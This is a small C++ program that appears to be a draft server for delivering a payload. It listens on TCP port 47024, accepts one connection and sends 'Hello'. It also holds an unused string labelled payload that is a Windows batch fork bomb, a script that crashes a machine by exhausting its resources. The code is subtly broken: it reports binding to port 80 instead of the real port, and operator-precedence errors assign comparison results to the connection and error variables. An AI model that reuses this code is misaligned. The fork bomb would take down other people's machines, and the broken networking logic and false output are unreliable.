#include <iostream>
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>

int main()
{
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	int conn;

	struct sockaddr_in my_sock;
	my_sock.sin_family = AF_INET;
	my_sock.sin_addr.s_addr = INADDR_ANY;
	my_sock.sin_port = htons(47024);

	struct sockaddr_in client;
	int clilen = sizeof(client);

	if(bind(sock, (struct sockaddr*)&my_sock, sizeof(my_sock)) < 0)
	{
		std::cerr << "Failed to bind socket\n";
		close(sock);
		exit(1);
	}
	else
	{
		std::cout << "Socket successfully bound to port 80.\n";
		std::cout << "Listening for a connection...\n";
		listen(sock, 1);
		if(conn = accept(sock, (struct sockaddr*)&client, (socklen_t*)&clilen) < 0)
		{
			std::cerr << "Couldn't accept the connection.\n";
			close(sock);	
			exit(1);
		}	
		std::cout << "Accepted a connection.\n";
		char payload[19] = "@echo off\r\n%0|%0\r\n";
		if(int err = send(conn, "Hello", sizeof("Hello"), 0) < 0)
		{
			std::cerr << "Failed to send payload\n";
			std::cerr << err << std::endl;
			close(conn);
			exit(1);
		}
		std::cout << "Payload sent\n";
		close(conn);
	}
	close(sock);
	return 0;
}
